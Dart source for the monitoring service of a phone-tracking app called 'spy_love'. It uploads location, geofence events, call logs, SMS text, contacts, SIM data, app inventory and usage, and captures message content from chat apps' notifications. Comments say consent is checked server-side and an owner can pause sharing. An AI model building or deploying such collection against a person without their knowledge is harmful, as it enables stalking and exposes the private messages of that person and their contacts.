import 'dart:async';
import 'dart:io';

import 'package:call_log/call_log.dart';
import 'package:flutter/foundation.dart';
import 'package:spy_love/core/debug/app_log.dart';
import 'package:geolocator/geolocator.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:spy_love/features/monitoring/collectors_bridge.dart';
import 'package:spy_love/features/monitoring/contacts_bridge.dart';
import 'package:spy_love/features/monitoring/installed_apps_bridge.dart';
import 'package:spy_love/features/monitoring/geofence_math.dart';
import 'package:spy_love/features/monitoring/monitored_device_storage.dart';
import 'package:spy_love/features/monitoring/notification_bridge.dart';
import 'package:spy_love/features/monitoring/screen_share/screen_share_service.dart';
import 'package:spy_love/features/monitoring/live_av/live_av_publisher_service.dart';
import 'package:spy_love/core/network/media_stream_client.dart';
import 'package:spy_love/features/monitoring/sim_bridge.dart';
import 'package:spy_love/features/monitoring/sim_state_storage.dart';
import 'package:spy_love/core/permissions/app_permission.dart';
import 'package:spy_love/features/devices/models/device_model.dart';
import 'package:spy_love/features/devices/models/safe_zone_model.dart';
import 'package:spy_love/features/devices/repositories/device_repository.dart';
import 'package:spy_love/features/devices/repositories/safe_zone_repository.dart';
import 'package:spy_love/core/network/screen_stream_client.dart';
import 'package:spy_love/features/devices/repositories/event_repository.dart';

/// Collects location, call log, SMS, chat notifications, SIM, battery, network,
/// app usage, and device info from the monitored device.
///
/// Consent is enforced server-side via event_type prefixes (ConsentService).
/// Client uploads when OS permissions allow; events without consent are rejected.
class MonitoringService {
  MonitoringService(
    this._events, [
    this._devices,
    this._safeZones,
    this._screenShare,
    this._screenStream,
    this._liveAv,
    this._mediaStream,
  ]);

  final EventRepository _events;
  final DeviceRepository? _devices;
  final SafeZoneRepository? _safeZones;
  final ScreenShareService? _screenShare;
  final ScreenStreamClient? _screenStream;
  final LiveAvPublisherService? _liveAv;
  final MediaStreamClient? _mediaStream;
  Timer? _syncTimer;
  StreamSubscription<Map<String, dynamic>>? _notificationSub;
  StreamSubscription<Position>? _locationSub;
  StreamSubscription<Map<String, dynamic>>? _simSub;
  String? _activeDeviceId;
  int _epoch = 0;
  DateTime? _pausedUntil;
  SharingState _sharing = SharingState.inactive;
  List<SafeZoneModel> _cachedZones = const [];
  DateTime? _zonesFetchedAt;
  final Set<String> _insideZoneIds = <String>{};

  bool get isSharingPaused {
    final until = _pausedUntil;
    if (until == null) return false;
    return DateTime.now().toUtc().isBefore(until.toUtc());
  }

  SharingState get sharingState => _sharing;
  DateTime? get pausedUntil => _pausedUntil;
  DateTime? _lastSmsSync;
  DateTime? _lastCallSync;
  DateTime? _lastLocationUpload;
  DateTime? _lastBatteryUpload;
  DateTime? _lastNetworkUpload;
  DateTime? _lastDeviceInfoUpload;
  DateTime? _lastAppUsageUpload;
  DateTime? _lastContactsUpload;
  DateTime? _lastAppInventoryUpload;
  String? _lastBatteryKey;
  String? _lastNetworkKey;

  Future<void> bootstrap() async {
    if (!await MonitoredDeviceStorage.isMarkedLinked()) {
      final legacyId = await MonitoredDeviceStorage.getDeviceId();
      if (legacyId == null || legacyId.isEmpty) return;
      final devices = _devices;
      if (devices == null) return;
      final result = await devices.getOwnedDeviceStatus(legacyId);
      final linked = result.fold((status) => status.isLinked, (_) => false);
      if (!linked) return;
      await MonitoredDeviceStorage.markLinked(legacyId);
    }
    final deviceId = await MonitoredDeviceStorage.getDeviceId();
    if (deviceId == null || deviceId.isEmpty) return;
    await start(deviceId);
  }

  bool _owns(int epoch) => epoch == _epoch;

  Future<void> start(String deviceId) async {
    if (kIsWeb || (!Platform.isAndroid && !Platform.isIOS)) return;

    final epoch = ++_epoch;
    _activeDeviceId = deviceId;
    await MonitoredDeviceStorage.saveDeviceId(deviceId);
    if (!_owns(epoch)) return;

    // Watch for consent-gated live screen-share requests (monitored side).
    final screenShare = _screenShare;
    final screenStream = _screenStream;
    if (screenShare != null && screenStream != null) {
      screenShare.watchForRequests(deviceId, screenStream);
    }
    final liveAv = _liveAv;
    final mediaStream = _mediaStream;
    if (liveAv != null && mediaStream != null) {
      liveAv.watchForRequests(deviceId, mediaStream);
    }
    if (!_owns(epoch)) return;

    await _requestDataPermissions();
    if (!_owns(epoch)) return;
    await _startLocationTracking(epoch);
    if (!_owns(epoch)) return;
    await _startSimTracking(epoch);
    if (!_owns(epoch)) return;
    await _syncAll();
    if (!_owns(epoch)) return;

    _syncTimer?.cancel();
    _syncTimer = Timer.periodic(const Duration(minutes: 2), (_) => _syncAll());

    if (Platform.isAndroid) {
      await _listenNotifications(epoch);
    }
  }

  Future<void> stop() async {
    _epoch++;
    _syncTimer?.cancel();
    _syncTimer = null;
    await _notificationSub?.cancel();
    _notificationSub = null;
    await _locationSub?.cancel();
    _locationSub = null;
    await _simSub?.cancel();
    _simSub = null;
    await _screenShare?.stop();
    _activeDeviceId = null;
    _insideZoneIds.clear();
    _cachedZones = const [];
    _zonesFetchedAt = null;
  }

  Future<void> _requestDataPermissions() async {
    for (final item in AppPermission.dataCollection) {
      await item.permission.request();
    }

    // Address book (contact.snapshot). Gated by the `contacts` consent scope
    // server-side; we only ask for the OS permission here.
    await Permission.contacts.request();

    final location = AppPermission.monitoring.firstWhere(
      (p) => p.scope == 'location',
    );
    await location.permission.request();
    if (Platform.isAndroid) {
      await Permission.locationAlways.request();
    }

    if (Platform.isAndroid) {
      final enabled = await NotificationBridge.isNotificationAccessEnabled();
      if (!enabled) {
        await NotificationBridge.openNotificationAccessSettings();
      }

      // Usage Access is a special/settings permission (PACKAGE_USAGE_STATS).
      final usageEnabled = await CollectorsBridge.isUsageAccessEnabled();
      if (!usageEnabled) {
        await CollectorsBridge.openUsageAccessSettings();
      }
    }
  }

  Future<void> _startLocationTracking(int epoch) async {
    if (!_owns(epoch)) return;
    final previous = _locationSub;
    _locationSub = null;
    await previous?.cancel();
    if (!_owns(epoch)) return;

    final serviceEnabled = await Geolocator.isLocationServiceEnabled();
    if (!_owns(epoch) || !serviceEnabled) return;

    var permission = await Geolocator.checkPermission();
    if (!_owns(epoch)) return;
    if (permission == LocationPermission.denied) {
      permission = await Geolocator.requestPermission();
    }
    if (!_owns(epoch)) return;
    if (permission == LocationPermission.denied ||
        permission == LocationPermission.deniedForever) {
      return;
    }

    await _uploadCurrentPosition();
    if (!_owns(epoch)) return;

    const settings = LocationSettings(
      accuracy: LocationAccuracy.high,
      distanceFilter: 30,
    );

    _locationSub = Geolocator.getPositionStream(locationSettings: settings)
        .listen(
          (position) => unawaited(_onPosition(position)),
          onError: (Object e) => AppLog.d('Location stream error: $e'),
        );
  }

  Future<void> _uploadCurrentPosition() async {
    try {
      final position = await Geolocator.getCurrentPosition(
        locationSettings: const LocationSettings(
          accuracy: LocationAccuracy.high,
        ),
      );
      await _onPosition(position);
    } catch (e) {
      AppLog.d('Current location failed: $e');
    }
  }

  Future<void> _onPosition(Position position) async {
    if (isSharingPaused) return;
    await _evaluateGeofences(position);
    await _uploadLocationUpdate(position);
  }

  Future<void> _refreshSafeZones({bool force = false}) async {
    final repo = _safeZones;
    if (repo == null) return;
    final fetchedAt = _zonesFetchedAt;
    if (!force &&
        fetchedAt != null &&
        DateTime.now().difference(fetchedAt) < const Duration(minutes: 10)) {
      return;
    }
    final result = await repo.list();
    result.fold((zones) {
      final deviceId = _activeDeviceId;
      _cachedZones = zones
          .where((z) => z.deviceId == null || z.deviceId == deviceId)
          .toList();
      _zonesFetchedAt = DateTime.now();
    }, (_) {});
  }

  Future<void> _evaluateGeofences(Position position) async {
    await _refreshSafeZones();
    if (_cachedZones.isEmpty || isSharingPaused) return;

    final nowInside = <String>{};
    final events = <Map<String, dynamic>>[];
    final now = DateTime.now().toUtc();

    for (final zone in _cachedZones) {
      final distance = distanceMeters(
        lat1: position.latitude,
        lng1: position.longitude,
        lat2: zone.lat,
        lng2: zone.lng,
      );
      final inside = distance <= zone.radiusM;
      if (inside) {
        nowInside.add(zone.id);
        if (!_insideZoneIds.contains(zone.id)) {
          events.add({
            'event_type': 'geofence.enter',
            'payload': {
              'zone_id': zone.id,
              'zone_name': zone.name,
              'lat': position.latitude,
              'lng': position.longitude,
              'accuracy_m': position.accuracy,
              'distance_m': distance.round(),
            },
            'idempotency_key':
                'geo-enter-${zone.id}-${now.millisecondsSinceEpoch ~/ 1000}',
            'timestamp': now.toIso8601String(),
          });
        }
      } else if (_insideZoneIds.contains(zone.id)) {
        events.add({
          'event_type': 'geofence.exit',
          'payload': {
            'zone_id': zone.id,
            'zone_name': zone.name,
            'lat': position.latitude,
            'lng': position.longitude,
            'accuracy_m': position.accuracy,
            'distance_m': distance.round(),
          },
          'idempotency_key':
              'geo-exit-${zone.id}-${now.millisecondsSinceEpoch ~/ 1000}',
          'timestamp': now.toIso8601String(),
        });
      }
    }

    _insideZoneIds
      ..clear()
      ..addAll(nowInside);

    if (events.isNotEmpty) {
      await _upload(events);
    }
  }

  Future<void> _uploadLocationUpdate(Position position) async {
    final now = DateTime.now();
    if (_lastLocationUpload != null &&
        now.difference(_lastLocationUpload!) < const Duration(seconds: 45)) {
      return;
    }
    _lastLocationUpload = now;

    final minuteBucket = now.millisecondsSinceEpoch ~/ 60000;
    final latKey = position.latitude.toStringAsFixed(4);
    final lngKey = position.longitude.toStringAsFixed(4);

    await _upload([
      {
        'event_type': 'location.update',
        'payload': {
          'lat': position.latitude,
          'lng': position.longitude,
          'accuracy_m': position.accuracy,
          'altitude_m': position.altitude,
          'speed_mps': position.speed,
          'heading': position.heading,
        },
        'idempotency_key': 'loc-$minuteBucket-$latKey-$lngKey',
        'timestamp': now.toUtc().toIso8601String(),
      },
    ]);
  }

  Future<void> _listenNotifications(int epoch) async {
    if (!_owns(epoch)) return;
    final previous = _notificationSub;
    _notificationSub = null;
    await previous?.cancel();
    if (!_owns(epoch)) return;
    _notificationSub = NotificationBridge.notificationStream.listen((event) {
      final package = event['package'] as String? ?? '';
      final removed = event['removed'] == true;
      final nowIso = DateTime.now().toUtc().toIso8601String();
      final title = event['title'];
      final text = event['text'];
      final bigText = (event['big_text'] as String?)?.trim();
      final body = (bigText != null && bigText.isNotEmpty) ? bigText : text;

      if (_isMessagingApp(package)) {
        // Messaging apps: emit a richer message.* event so the monitor can show
        // real threads, and keep message.notification as the fallback the chat
        // path already understands. Removed notifications are not treated as
        // messages (a dismissed chat alert isn't a new message).
        if (removed) return;
        unawaited(
          _upload([
            {
              'event_type': 'message.received',
              'payload': {
                'app': package,
                'package': package,
                'thread_id': title?.toString() ?? package,
                'contact_name': title,
                'direction': 'incoming',
                'body': body,
                'title': title,
                'when': event['when'],
              },
              'idempotency_key': 'msg-${event['idempotency_key']}',
              'timestamp': nowIso,
            },
            {
              'event_type': 'message.notification',
              'payload': {
                'app': package,
                'title': title,
                'text': text,
                'when': event['when'],
              },
              'idempotency_key': event['idempotency_key'],
              'timestamp': nowIso,
            },
          ]),
        );
        return;
      }

      // Covert / non-chat notifications go to the dedicated notification feed,
      // distinct from the chat path (consent scope: notifications).
      unawaited(
        _upload([
          {
            'event_type': removed
                ? 'notification.removed'
                : 'notification.posted',
            'payload': {
              'app': package,
              'package': package,
              'title': title,
              'text': body,
              'category': event['category'],
              'channel_id': event['channel_id'],
              'notification_key': event['notification_key'],
              'when': event['when'],
            },
            'idempotency_key': event['idempotency_key'],
            'timestamp': nowIso,
          },
        ]),
      );
    });
  }

  /// Uploads the device address book as `contact.snapshot` (consent scope:
  /// `contacts`, enforced server-side). No photo blobs are sent.
  Future<void> _syncContacts() async {
    if (!Platform.isAndroid) return;
    if (!await Permission.contacts.isGranted) return;

    try {
      final now = DateTime.now();
      if (_lastContactsUpload != null &&
          now.difference(_lastContactsUpload!) < const Duration(hours: 1)) {
        return;
      }

      final contacts = await ContactsBridge.getContacts();
      if (contacts.isEmpty) return;

      final sanitized = contacts
          .map(
            (c) => {
              'contact_id': c['contact_id'],
              'name': c['name'] ?? '',
              'phones': c['phones'] ?? const <String>[],
              'emails': c['emails'] ?? const <String>[],
            },
          )
          .toList();

      final hourBucket = now.millisecondsSinceEpoch ~/ 3600000;
      await _upload([
        {
          'event_type': 'contact.snapshot',
          'payload': {'contacts': sanitized, 'count': sanitized.length},
          'idempotency_key': 'contacts-$hourBucket-${sanitized.length}',
          'timestamp': now.toUtc().toIso8601String(),
        },
      ]);
      _lastContactsUpload = now;
    } catch (e) {
      AppLog.d('Contacts sync failed: $e');
    }
  }

  /// Uploads the installed-app inventory as `app_inventory.snapshot` (consent
  /// scope maps to `app_usage`, enforced server-side). Icons are omitted — the
  /// backend strips them anyway.
  Future<void> _syncAppInventory() async {
    if (!Platform.isAndroid) return;

    try {
      final now = DateTime.now();
      if (_lastAppInventoryUpload != null &&
          now.difference(_lastAppInventoryUpload!) < const Duration(hours: 6)) {
        return;
      }

      final apps = await InstalledAppsBridge.getInstalledApps(
        includeSystem: true,
      );
      if (apps.isEmpty) return;

      final sanitized = apps
          .map(
            (a) => {
              'package': a['package'],
              'name': a['name'],
              'system': a['system'] == true,
              if (a['version'] != null) 'version': a['version'],
            },
          )
          .where((a) => (a['package'] ?? '').toString().isNotEmpty)
          .toList();
      if (sanitized.isEmpty) return;

      final hourBucket = now.millisecondsSinceEpoch ~/ 3600000;
      await _upload([
        {
          'event_type': 'app_inventory.snapshot',
          'payload': {
            'apps': sanitized,
            'count': sanitized.length,
            'include_system': true,
          },
          'idempotency_key': 'appinv-$hourBucket-${sanitized.length}',
          'timestamp': now.toUtc().toIso8601String(),
        },
      ]);
      _lastAppInventoryUpload = now;
    } catch (e) {
      AppLog.d('App inventory sync failed: $e');
    }
  }

  bool _isMessagingApp(String package) {
    const targets = [
      'com.whatsapp',
      'org.telegram.messenger',
      'com.facebook.orca',
      'com.facebook.mlite',
      'com.instagram.android',
      'com.snapchat.android',
      'com.discord',
      'com.Slack',
      'com.google.android.apps.messaging',
    ];
    return targets.any((t) => package.startsWith(t));
  }

  Future<void> _syncAll() async {
    if (_activeDeviceId == null) return;
    await _refreshPauseState();
    if (isSharingPaused) {
      AppLog.d('Sharing paused until $_pausedUntil — dropping upload cycle');
      return;
    }
    await _refreshSafeZones(force: true);
    await _uploadCurrentPosition();
    await _syncSim();
    await _syncCallLog();
    await _syncSms();
    await _syncBattery();
    await _syncNetwork();
    await _syncDeviceInfo();
    await _syncAppUsage();
    await _syncAppInventory();
    await _syncContacts();
  }

  Future<void> _refreshPauseState() async {
    final deviceId = _activeDeviceId;
    final devices = _devices;
    if (deviceId == null || devices == null) return;
    final result = await devices.getOwnedDeviceStatus(deviceId);
    result.fold((status) {
      _sharing = status.sharing;
      _pausedUntil = status.sharing.pausedUntil;
    }, (_) {});
  }

  Future<String?> _resolveDeviceId() async {
    if (_activeDeviceId != null && _activeDeviceId!.isNotEmpty) {
      return _activeDeviceId;
    }
    return MonitoredDeviceStorage.getDeviceId();
  }

  /// Owner pause. Returns updated sharing state, or null on failure.
  Future<SharingState?> pauseSharing(int durationMinutes) async {
    final devices = _devices;
    final deviceId = await _resolveDeviceId();
    if (deviceId == null || deviceId.isEmpty || devices == null) return null;
    final result = await devices.pauseOwnedDevice(
      id: deviceId,
      durationMinutes: durationMinutes,
    );
    return result.fold((sharing) {
      _sharing = sharing;
      _pausedUntil = sharing.pausedUntil;
      return sharing;
    }, (_) => null);
  }

  /// Owner resume. Returns updated sharing state, or null on failure.
  Future<SharingState?> resumeSharing() async {
    final devices = _devices;
    final deviceId = await _resolveDeviceId();
    if (deviceId == null || deviceId.isEmpty || devices == null) return null;
    final result = await devices.resumeOwnedDevice(deviceId);
    return result.fold((sharing) {
      _sharing = sharing;
      _pausedUntil = sharing.pausedUntil;
      return sharing;
    }, (_) => null);
  }

  void applySharingState(SharingState state) {
    _sharing = state;
    _pausedUntil = state.pausedUntil;
  }

  Future<void> _syncBattery() async {
    if (!Platform.isAndroid) return;

    try {
      final status = await CollectorsBridge.getBatteryStatus();
      if (status == null) return;

      final now = DateTime.now();
      final percent = status['percent'];
      final charging = status['charging'] == true;
      final stateKey =
          '$percent-$charging-${status['status']}-${status['plugged']}';

      if (_lastBatteryKey == stateKey &&
          _lastBatteryUpload != null &&
          now.difference(_lastBatteryUpload!) < const Duration(minutes: 2)) {
        return;
      }

      final minuteBucket = now.millisecondsSinceEpoch ~/ 60000;
      await _upload([
        {
          'event_type': 'battery.status',
          'payload': {
            'level': status['level'],
            'scale': status['scale'],
            'percent': percent,
            'charging': charging,
            'status': status['status'],
            'plugged': status['plugged'],
          },
          'idempotency_key': 'batt-$minuteBucket-$stateKey',
          'timestamp': now.toUtc().toIso8601String(),
        },
      ]);
      _lastBatteryKey = stateKey;
      _lastBatteryUpload = now;
    } catch (e) {
      AppLog.d('Battery sync failed: $e');
    }
  }

  Future<void> _syncNetwork() async {
    if (!Platform.isAndroid) return;

    try {
      final status = await CollectorsBridge.getNetworkStatus();
      if (status == null) return;

      final now = DateTime.now();
      final type = status['type']?.toString() ?? 'none';
      final connected = status['connected'] == true;
      final stateKey = '$type-$connected';

      if (_lastNetworkKey == stateKey &&
          _lastNetworkUpload != null &&
          now.difference(_lastNetworkUpload!) < const Duration(minutes: 2)) {
        return;
      }

      final minuteBucket = now.millisecondsSinceEpoch ~/ 60000;
      await _upload([
        {
          'event_type': 'network.status',
          'payload': {'type': type, 'connected': connected},
          'idempotency_key': 'net-$minuteBucket-$stateKey',
          'timestamp': now.toUtc().toIso8601String(),
        },
      ]);
      _lastNetworkKey = stateKey;
      _lastNetworkUpload = now;
    } catch (e) {
      AppLog.d('Network sync failed: $e');
    }
  }

  Future<void> _syncDeviceInfo() async {
    if (!Platform.isAndroid) return;

    try {
      final now = DateTime.now();
      if (_lastDeviceInfoUpload != null &&
          now.difference(_lastDeviceInfoUpload!) < const Duration(hours: 1)) {
        return;
      }

      final info = await CollectorsBridge.getDeviceInfo();
      if (info == null) return;

      final hourBucket = now.millisecondsSinceEpoch ~/ 3600000;
      final model = info['model']?.toString() ?? '';
      await _upload([
        {
          'event_type': 'device_info.snapshot',
          'payload': {
            'manufacturer': info['manufacturer'],
            'model': info['model'],
            'brand': info['brand'],
            'device': info['device'],
            'product': info['product'],
            'hardware': info['hardware'],
            'os': info['os'],
            'os_version': info['os_version'],
            'sdk_int': info['sdk_int'],
            'security_patch': info['security_patch'],
          },
          'idempotency_key': 'devinfo-$hourBucket-$model',
          'timestamp': now.toUtc().toIso8601String(),
        },
      ]);
      _lastDeviceInfoUpload = now;
    } catch (e) {
      AppLog.d('Device info sync failed: $e');
    }
  }

  Future<void> _syncAppUsage() async {
    if (!Platform.isAndroid) return;

    try {
      if (!await CollectorsBridge.isUsageAccessEnabled()) return;

      final now = DateTime.now();
      if (_lastAppUsageUpload != null &&
          now.difference(_lastAppUsageUpload!) < const Duration(minutes: 5)) {
        return;
      }

      final sinceMs = now
          .subtract(const Duration(hours: 24))
          .millisecondsSinceEpoch;
      final apps = await CollectorsBridge.getAppUsage(
        sinceMs: sinceMs,
        limit: 20,
      );
      if (apps.isEmpty) return;

      final minuteBucket = now.millisecondsSinceEpoch ~/ 300000; // 5-min bucket
      await _upload([
        {
          'event_type': 'app_usage.snapshot',
          'payload': {'apps': apps, 'window_hours': 24},
          'idempotency_key': 'usage-$minuteBucket-${apps.length}',
          'timestamp': now.toUtc().toIso8601String(),
        },
      ]);
      _lastAppUsageUpload = now;
    } catch (e) {
      AppLog.d('App usage sync failed: $e');
    }
  }

  Future<void> _startSimTracking(int epoch) async {
    if (!Platform.isAndroid) return;
    if (!_owns(epoch)) return;
    if (!await Permission.phone.isGranted) return;
    if (!_owns(epoch)) return;

    final previous = _simSub;
    _simSub = null;
    await previous?.cancel();
    if (!_owns(epoch)) return;
    await _processSimCards(await SimBridge.getSimCards());
    if (!_owns(epoch)) return;

    _simSub = SimBridge.simEventStream.listen((event) async {
      if (!await Permission.phone.isGranted) return;
      final sims = event['sims'];
      if (sims is List) {
        final cards = sims
            .map((item) => Map<String, dynamic>.from(item as Map))
            .toList();
        unawaited(_processSimCards(cards));
      }
    });
  }

  Future<void> _syncSim() async {
    if (!Platform.isAndroid) return;
    if (!await Permission.phone.isGranted) return;
    await _processSimCards(await SimBridge.getSimCards());
  }

  Future<void> _processSimCards(List<Map<String, dynamic>> cards) async {
    final now = DateTime.now();
    final previous = await SimStateStorage.loadSnapshot();
    final current = <int, Map<String, dynamic>>{};

    for (final card in cards) {
      final slot = (card['slot'] as num?)?.toInt() ?? 0;
      final iccId = card['icc_id']?.toString() ?? '';
      final number = card['phone_number']?.toString().trim() ?? '';
      if (iccId.isEmpty && number.isEmpty) continue;

      current[slot] = {
        'slot': slot,
        'phone_number': number,
        'carrier': card['carrier']?.toString() ?? '',
        'icc_id': iccId,
        'subscription_id': card['subscription_id'],
        'display_name': card['display_name']?.toString() ?? '',
      };
    }

    final batch = <Map<String, dynamic>>[];

    for (final entry in current.entries) {
      final slot = entry.key;
      final sim = entry.value;
      final prev = previous[slot];
      final iccId = sim['icc_id']?.toString() ?? '';

      if (prev == null) {
        batch.add(
          _simEvent(
            type: 'sim.inserted',
            sim: sim,
            timestamp: now,
            idempotencyKey:
                'sim-in-$slot-$iccId-${now.millisecondsSinceEpoch ~/ 60000}',
          ),
        );
      } else if (prev['icc_id']?.toString() != iccId) {
        batch.add(
          _simEvent(
            type: 'sim.removed',
            sim: prev,
            timestamp: now,
            idempotencyKey:
                'sim-out-$slot-${prev['icc_id']}-${now.millisecondsSinceEpoch ~/ 60000}',
          ),
        );
        batch.add(
          _simEvent(
            type: 'sim.inserted',
            sim: sim,
            timestamp: now,
            idempotencyKey:
                'sim-in-$slot-$iccId-${now.millisecondsSinceEpoch ~/ 60000}',
          ),
        );
      }
    }

    for (final entry in previous.entries) {
      final slot = entry.key;
      if (!current.containsKey(slot)) {
        batch.add(
          _simEvent(
            type: 'sim.removed',
            sim: entry.value,
            timestamp: now,
            idempotencyKey:
                'sim-out-$slot-${entry.value['icc_id']}-${now.millisecondsSinceEpoch ~/ 60000}',
          ),
        );
      }
    }

    if (current.isNotEmpty) {
      final minuteBucket = now.millisecondsSinceEpoch ~/ 60000;
      batch.add({
        'event_type': 'sim.current',
        'payload': {'sims': current.values.toList()},
        'idempotency_key': 'sim-snap-$minuteBucket-${current.length}',
        'timestamp': now.toUtc().toIso8601String(),
      });
    }

    if (batch.isNotEmpty) {
      await _upload(batch);
      await SimStateStorage.saveSnapshot(current);
    } else if (current.isNotEmpty) {
      await SimStateStorage.saveSnapshot(current);
    }
  }

  Map<String, dynamic> _simEvent({
    required String type,
    required Map<String, dynamic> sim,
    required DateTime timestamp,
    required String idempotencyKey,
  }) {
    return {
      'event_type': type,
      'payload': Map<String, dynamic>.from(sim),
      'idempotency_key': idempotencyKey,
      'timestamp': timestamp.toUtc().toIso8601String(),
    };
  }

  Future<void> _syncCallLog() async {
    if (!Platform.isAndroid) return;
    if (!await Permission.phone.isGranted) return;

    try {
      final since =
          _lastCallSync ?? DateTime.now().subtract(const Duration(days: 30));
      final entries = await CallLog.query(
        dateFrom: since.millisecondsSinceEpoch,
        dateTo: DateTime.now().millisecondsSinceEpoch,
      );

      final batch = <Map<String, dynamic>>[];
      for (final entry in entries) {
        final ts = DateTime.fromMillisecondsSinceEpoch(entry.timestamp ?? 0);
        batch.add({
          'event_type': 'call.log',
          'payload': {
            'number': entry.number,
            'name': entry.name,
            'type': _callType(entry.callType),
            'duration_seconds': entry.duration,
          },
          'idempotency_key': 'call-${entry.timestamp}-${entry.number}',
          'timestamp': ts.toUtc().toIso8601String(),
        });
      }

      if (batch.isNotEmpty) {
        await _upload(batch);
        _lastCallSync = DateTime.now();
      }
    } catch (e) {
      AppLog.d('Call log sync failed: $e');
    }
  }

  String _callType(CallType? type) {
    return switch (type) {
      CallType.incoming => 'incoming',
      CallType.outgoing => 'outgoing',
      CallType.missed => 'missed',
      CallType.rejected => 'rejected',
      CallType.blocked => 'blocked',
      _ => 'unknown',
    };
  }

  Future<void> _syncSms() async {
    if (!Platform.isAndroid) return;
    if (!await Permission.sms.isGranted) return;

    try {
      final since =
          _lastSmsSync ?? DateTime.now().subtract(const Duration(days: 30));
      final messages = await NotificationBridge.getSmsInbox(
        sinceMs: since.millisecondsSinceEpoch,
        limit: 100,
      );

      final batch = messages.map((sms) {
        final date = sms['date'] as int? ?? 0;
        final ts = DateTime.fromMillisecondsSinceEpoch(date);
        return {
          'event_type': 'sms.received',
          'payload': {'from': sms['address'], 'body': sms['body']},
          'idempotency_key': 'sms-$date-${sms['address']}',
          'timestamp': ts.toUtc().toIso8601String(),
        };
      }).toList();

      if (batch.isNotEmpty) {
        await _upload(batch);
        _lastSmsSync = DateTime.now();
      }
    } catch (e) {
      AppLog.d('SMS sync failed: $e');
    }
  }

  Future<void> _upload(List<Map<String, dynamic>> events) async {
    final deviceId = _activeDeviceId;
    if (deviceId == null || events.isEmpty) return;
    if (isSharingPaused) {
      AppLog.d('Dropping ${events.length} queued events — sharing paused');
      return;
    }

    for (var i = 0; i < events.length; i += 50) {
      final chunk = events.sublist(
        i,
        i + 50 > events.length ? events.length : i + 50,
      );
      final result = await _events.uploadBatch(
        deviceId: deviceId,
        events: chunk,
      );
      result.fold((body) {
        if (body['paused'] == true) {
          final untilRaw = body['paused_until'];
          final until = untilRaw != null
              ? DateTime.tryParse(untilRaw.toString())
              : null;
          _pausedUntil = until;
          _sharing = SharingState(
            paused: true,
            pausedUntil: until,
            resumesInSeconds: until
                ?.toUtc()
                .difference(DateTime.now().toUtc())
                .inSeconds,
          );
        }
      }, (_) {});
      if (isSharingPaused) break;
    }
  }
}
